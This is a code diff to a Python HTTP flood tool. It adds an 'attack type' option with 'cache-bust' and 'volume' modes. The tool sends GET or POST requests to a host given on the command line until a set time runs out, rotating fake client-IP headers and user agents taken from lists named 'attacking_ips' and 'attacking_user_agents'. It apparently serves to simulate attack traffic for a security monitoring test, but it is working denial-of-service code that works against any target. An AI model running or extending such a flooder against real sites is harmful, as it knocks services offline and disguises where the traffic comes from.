@@ -16,13 +16,21 @@ def req(id, config):
     for i in config:
         url = f"https://{config['host']}{config['path']}"
         while time.time() <= config['t_end']:
-            hash = {"_":random.getrandbits(24)}
-            match config['method']:
-                case "GET":
-                    r = requests.get(url, params=hash, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"})
-                case "POST":
-                    r = requests.post(url, params=hash, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"})
-            #i = i + 1
+            match config['type']:
+                case "cache-bust":
+                    hash = {"_":random.getrandbits(24)}
+                    match config['method']:
+                        case "GET":
+                            r = requests.get(url, params=hash, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"})
+                        case "POST":
+                            r = requests.post(url, params=hash, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"})
+                case "volume":
+                    match config['method']:
+                        case "GET":
+                            r = requests.get(url, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"})
+                        case "POST":
+                            r = requests.post(url, headers={"X-CSOC-Client-IP":f"{random.choice(lists.attacking_ips)}","User-Agent": f"{random.choice(lists.attacking_user_agents)}"}) 
+                    #i = i + 1
 
 
 
@@ -63,12 +71,13 @@ if __name__ == '__main__':
     parser.add_argument('-p', help= 'port', type=int)
     parser.add_argument('-m', help= 'method', type=str)
     parser.add_argument('-t', help= 'time in seconds to run the traffic for', type=int)
+    parser.add_argument('-ty', help= 'type of attack', type=str)
     args = parser.parse_args()
     if args.host is None: 
         print('Please provide a host')
         exit()
     
-    config = {'host':args.host, 'path': args.path, 'method': str.upper(args.m), 't_end': args.t, 'port': args.p}
+    config = {'host':args.host, 'path': args.path, 'method': str.upper(args.m),'type': str.lower(args.ty),'t_end': args.t, 'port': args.p}
     print(config)
     manager(config)
         
